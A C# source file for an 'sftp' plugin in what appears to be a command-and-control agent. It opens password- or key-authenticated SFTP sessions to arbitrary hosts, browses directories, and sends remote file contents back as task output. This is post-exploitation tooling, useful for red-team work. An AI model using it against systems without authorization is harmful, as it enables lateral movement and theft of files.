using Renci.SshNet;
using Renci.SshNet.Sftp;
using System.Text;
using System.Text.RegularExpressions;

using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    internal class SftpSession
    {
        internal SftpClient client { get; set; }
        internal string currPath { get; set; }
        internal SftpSession(SftpClient client)
        {
            this.client = client;
            this.currPath = "/";
        }
    }
    public class Plugin : IPlugin
    {
        public string Name => "sftp";
        Dictionary<string, SftpSession> sessions = new Dictionary<string, SftpSession>();
        string currentSession = "";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                StringBuilder sb = new StringBuilder();

                string action = args["action"];

                switch (action.ToLower())
                {
                    case "upload":
                        //return RunCommand(args);
                        await messageManager.AddResponse(new TaskResponse
                        {
                            task_id = job.task.id,
                            process_response = new Dictionary<string, string> { { "message", "0x10" } },
                            completed = true,
                            status = "error"
                        });
                        break;
                    case "download":
                        await messageManager.AddResponse(DownloadFile(args, job.task.id));
                        break;
                    case "connect":
                        await messageManager.AddResponse(Connect(args, job.task.id));
                        break;
                    case "disconnect":
                        await messageManager.AddResponse(Disconnect(args, job.task.id));
                        break;
                    case "list-sessions":
                        await messageManager.AddResponse(ListSessions(args, job.task.id));
                        break;
                    case "switch-session":
                        if (!string.IsNullOrEmpty(args["args"]))
                        {
                            currentSession = args["args"];
                            await messageManager.AddResponse(new TaskResponse
                            {
                                task_id = job.task.id,
                                user_output = $"Switched session to: {currentSession}",
                                completed = true,
                            });
                        }
                        else
                        {
                            await messageManager.AddResponse(new TaskResponse
                            {
                                task_id = job.task.id,
                                process_response = new Dictionary<string, string> { { "message", "0x2D" } },
                                completed = true,
                                status = "error"
                            });
                        }
                        break;
                    case "ls":
                        await messageManager.AddResponse(ListDirectories(args, job.task.id));
                        break;
                    case "cd":
                        await messageManager.AddResponse(ChangeDirectory(args, job.task.id));
                        break;
                    case "pwd":
                        await messageManager.AddResponse(GetCurrentDirectory(args, job.task.id));
                        break;
                    default:
                        await messageManager.AddResponse(new TaskResponse
                        {
                            task_id = job.task.id,
                            process_response = new Dictionary<string, string> { { "message", "0x2E" } },
                            completed = true,
                            status = "error"
                        });
                        break;

                }
            }
            catch (Exception e)
            {
                messageManager.Write(e.ToString(), job.task.id, true, "error");
                return;
            }
        }
        TaskResponse DownloadFile(Dictionary<string, string> args, string task_id)
        {
            if (string.IsNullOrEmpty(currentSession))
            {
                return new FileBrowserTaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x2F" } },
                    completed = true,
                    status = "error"
                };
            }
            else if (!args.ContainsKey("args") || string.IsNullOrEmpty(args["args"]))
            {
                return new FileBrowserTaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x27" } },
                    completed = true,
                    status = "error"
                };
            }
            string output = "";

            try
            {
                using (var remoteFileStream = sessions[currentSession].client.OpenRead((args["args"]).Replace("\"", "")))
                {
                    var textReader = new System.IO.StreamReader(remoteFileStream);
                    output = textReader.ReadToEnd();
                }

                if (!string.IsNullOrEmpty(output))
                {
                    return new FileBrowserTaskResponse
                    {
                        task_id = task_id,
                        user_output = output,
                        completed = true,

                    };
                }
                else
                {
                    return new FileBrowserTaskResponse
                    {
                        task_id = task_id,
                        process_response = new Dictionary<string, string> { { "message", "0x30" } },
                        completed = true,
                        status = "error"
                    };
                }
            }
            catch (Exception e)
            {
                return new FileBrowserTaskResponse
                {
                    task_id = task_id,
                    user_output = e.ToString(),
                    completed = true,
                    status = "error"
                };
            }
        }

        TaskResponse Connect(Dictionary<string, string> args, string task_id)
        {
            ConnectionInfo connectionInfo;
            string hostname = args["hostname"];
            int port = 22;
            if (hostname.Contains(':'))
            {
                string[] hostnameParts = hostname.Split(':');
                hostname = hostnameParts[0];
                port = int.Parse(hostnameParts[1]);
            }

            if (args.ContainsKey("keypath") && !String.IsNullOrEmpty(args["keypath"])) //SSH Key Auth
            {
                string keyPath = args["keypath"];
                PrivateKeyAuthenticationMethod authenticationMethod;

                if (!String.IsNullOrEmpty(args["password"]))
                {
                    PrivateKeyFile pk = new PrivateKeyFile(keyPath, args["password"]);
                    authenticationMethod = new PrivateKeyAuthenticationMethod(args["username"], new PrivateKeyFile[] { pk });
                    connectionInfo = new ConnectionInfo(hostname, port, args["username"], authenticationMethod);
                }
                else
                {
                    PrivateKeyFile pk = new PrivateKeyFile(keyPath);
                    authenticationMethod = new PrivateKeyAuthenticationMethod(args["username"], new PrivateKeyFile[] { pk });
                    connectionInfo = new ConnectionInfo(hostname, port, args["username"], authenticationMethod);
                }
            }
            else //Username & Password Auth
            {
                PasswordAuthenticationMethod authenticationMethod = new PasswordAuthenticationMethod(args["username"], args["password"]);
                connectionInfo = new ConnectionInfo(hostname, port, args["username"], authenticationMethod);
            }
            SftpClient sftpClient = new SftpClient(connectionInfo);

            try
            {
                sftpClient.Connect();

                if (sftpClient.IsConnected)
                {
                    string guid = Guid.NewGuid().ToString();
                    sessions.Add(guid, new SftpSession(sftpClient));
                    currentSession = guid;

                    return new TaskResponse
                    {
                        task_id = task_id,
                        user_output = $"Successfully initiated session {sftpClient.ConnectionInfo.Username}@{sftpClient.ConnectionInfo.Host} - {guid}",
                        completed = true,
                    };
                }
                return new TaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x31" } },
                    completed = true,
                };
            }
            catch (Exception e)
            {
                return new TaskResponse
                {
                    task_id = task_id,
                    user_output = e.ToString(),
                    completed = true,
                };
            }
        }
        TaskResponse Disconnect(Dictionary<string, string> args, string task_id)
        {
            string session;
            if (String.IsNullOrEmpty(args["args"]))
            {
                session = currentSession;
            }
            else
            {
                session = args["args"];
            }

            if (!sessions.ContainsKey(session))
            {
                return new TaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x2D" } },
                    completed = true,
                    status = "error"
                };
            }
            if (!sessions[session].client.IsConnected)
            {
                sessions.Remove(session);
                return new TaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x32" } },
                    completed = true
                };
            }

            sessions[session].client.Disconnect();

            if (!sessions[session].client.IsConnected)
            {
                sessions.Remove(session);
                return new TaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x33" } },
                    completed = true,
                };
            }
            else
            {
                return new TaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x34" } },
                    completed = true,
                    status = "error",
                };
            }
        }
        FileBrowserTaskResponse ListDirectories(Dictionary<string, string> args, string task_id)
        {
            FileBrowserTaskResponse fb = new FileBrowserTaskResponse();
            List<FileBrowserFile> directoryFiles = new List<FileBrowserFile>();
            string path;
            if (string.IsNullOrEmpty(currentSession))
            {
                return new FileBrowserTaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x2F" } },
                    completed = true,
                    status = "error"
                };
            }
            if (!args.ContainsKey("args") || string.IsNullOrEmpty(args["args"]))
            {
                path = sessions[currentSession].client.WorkingDirectory;
            }
            else if ((args["args"]).StartsWith('/'))
            {
                path = args["args"];
            }
            else if ((args["args"]) == ".")
            {
                path = sessions[currentSession].client.WorkingDirectory;
            }
            else if ((args["args"]).Contains("../"))
            {
                string curPath = NormalizePath(sessions[currentSession].client.WorkingDirectory);
                var numdirs = Regex.Matches(args["args"], @"(\.\.\/)").Count;
                for (int i = 0; i < numdirs; i++)
                {
                    curPath = GetParentPath(curPath);
                }
                path = "/" + NormalizePath(curPath) + NormalizePath((args["args"]).Replace("../", ""));
            }
            else
            {
                path = sessions[currentSession].client.WorkingDirectory + "/" + (args["args"]);
            }

            path = NormalizePath(path);
            SftpFile parentDir = (SftpFile)sessions[currentSession].client.Get(NormalizeFullPath(GetParentPath(path)));

            var files = sessions[currentSession].client.ListDirectory(path);

            foreach (SftpFile file in files)
            {
                var f = new FileBrowserFile
                {
                    is_file = file.IsRegularFile,
                    permissions = new Dictionary<string, string> {
                        {"GroupCanExecute", file.GroupCanExecute.ToString() },
                        {"GroupCanRead", file.GroupCanRead.ToString() },
                        {"GroupCanWrite", file.GroupCanWrite.ToString() },
                        {"OwnerCanExecute", file.OwnerCanExecute.ToString() },
                        {"OwnerCanRead", file.OwnerCanRead.ToString() },
                        {"OwnerCanWrite", file.OwnerCanWrite.ToString() },
                        {"OthersCanWrite", file.OthersCanWrite.ToString() },
                        {"OthersCanExecute", file.OthersCanExecute.ToString() },
                        {"OthersCanRead", file.OthersCanRead.ToString() },
                        {"IsSymbolicLink", file.IsSymbolicLink.ToString() },
                        {"UserId", file.UserId.ToString() }
                    },
                    access_time = GetTimeStamp(new DateTimeOffset(file.LastAccessTime).ToUnixTimeMilliseconds()),
                    modify_time = GetTimeStamp(new DateTimeOffset(file.LastWriteTime).ToUnixTimeMilliseconds()),
                    name = file.Name,
                    size = file.Length,
                };
                directoryFiles.Add(f);
            }

            return new FileBrowserTaskResponse
            {
                task_id = task_id,
                completed = true,
                process_response = new Dictionary<string, string> { { "message", "0x28" } },
                file_browser = new FileBrowser
                {
                    host = sessions[currentSession].client.ConnectionInfo.Host,
                    is_file = false,
                    success = true,
                    name = Path.GetFileName(path.TrimEnd('/')),
                    files = directoryFiles,
                    parent_path = parentDir.FullName,
                    access_time = GetTimeStamp(new DateTimeOffset(parentDir.LastAccessTime).ToUnixTimeMilliseconds()),
                    modify_time = GetTimeStamp(new DateTimeOffset(parentDir.LastWriteTime).ToUnixTimeMilliseconds()),
                    size = parentDir.Length,
                    permissions = new Dictionary<string, string> {
                        {"GroupCanExecute", parentDir.GroupCanExecute.ToString() },
                        {"GroupCanRead", parentDir.GroupCanRead.ToString() },
                        {"GroupCanWrite", parentDir.GroupCanWrite.ToString() },
                        {"OwnerCanExecute", parentDir.OwnerCanExecute.ToString() },
                        {"OwnerCanRead", parentDir.OwnerCanRead.ToString() },
                        {"OwnerCanWrite", parentDir.OwnerCanWrite.ToString() },
                        {"OthersCanWrite", parentDir.OthersCanWrite.ToString() },
                        {"OthersCanExecute", parentDir.OthersCanExecute.ToString() },
                        {"OthersCanRead", parentDir.OthersCanRead.ToString() },
                        {"IsSymbolicLink", parentDir.IsSymbolicLink.ToString() },
                        {"UserId", parentDir.UserId.ToString() }
                    },
                },
            };
        }
        TaskResponse ListSessions(Dictionary<string, string> args, string task_id)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Active Sessions");
            sb.AppendLine("--------------------------");
            foreach (var sftpClient in sessions)
            {
                if (sftpClient.Value.client.IsConnected)
                {
                    sb.AppendLine($"Active - {sftpClient.Key} - {sftpClient.Value.client.ConnectionInfo.Username}@{sftpClient.Value.client.ConnectionInfo.Host}");
                }
                else
                {
                    sessions.Remove(sftpClient.Key);
                }
            }

            return new TaskResponse
            {
                task_id = task_id,
                user_output = sb.ToString(),
                completed = true,
            };
        }
        TaskResponse ChangeDirectory(Dictionary<string, string> args, string task_id)
        {
            if (string.IsNullOrEmpty(currentSession))
            {
                return new FileBrowserTaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x2F" } },
                    completed = true,
                    status = "error"
                };
            }

            if (string.IsNullOrEmpty(args["args"]))
            {
                return new FileBrowserTaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x27" } },
                    completed = true,
                    status = "error"
                };
            }
            sessions[currentSession].client.ChangeDirectory(args["args"]);
            return new FileBrowserTaskResponse
            {
                task_id = task_id,
                user_output = $"Changed directory to {sessions[currentSession].client.WorkingDirectory}.",
                completed = true,
            };
        }
        TaskResponse GetCurrentDirectory(Dictionary<string, string> args, string task_id)
        {
            if (string.IsNullOrEmpty(currentSession))
            {
                return new FileBrowserTaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x2F" } },
                    completed = true,
                    status = "error"
                };
            }

            return new FileBrowserTaskResponse
            {
                task_id = task_id,
                user_output = sessions[currentSession].client.WorkingDirectory,
                completed = true,
            };
        }
        string GetParentPath(string path)
        {
            string[] pathParts = path.Replace('\\', '/').Split('/').Where(x => !string.IsNullOrEmpty(x)).ToArray();
            if (pathParts.Count() <= 1)
            {
                return "/";
            }
            else
            {
                pathParts = pathParts.Take(pathParts.Count() - 1).ToArray();
                return string.Join('/', pathParts);
            }
        }
        string NormalizePath(string path)
        {
            string normalizedPath = path;
            if (!path.EndsWith('/'))
            {
                normalizedPath = path + '/';
            }
            return normalizedPath;
        }
        string NormalizeFullPath(string path)
        {
            if (path[0] != '/')
            {
                path = "/" + path;
            }

            if (!path.EndsWith('/'))
            {
                path = path + "/";
            }

            return path;
        }
        UInt64 GetTimeStamp(long timestamp)
        {
            try
            {
                return Convert.ToUInt64(timestamp);
            }
            catch
            {
                return 0;
            }
        }
    }
}


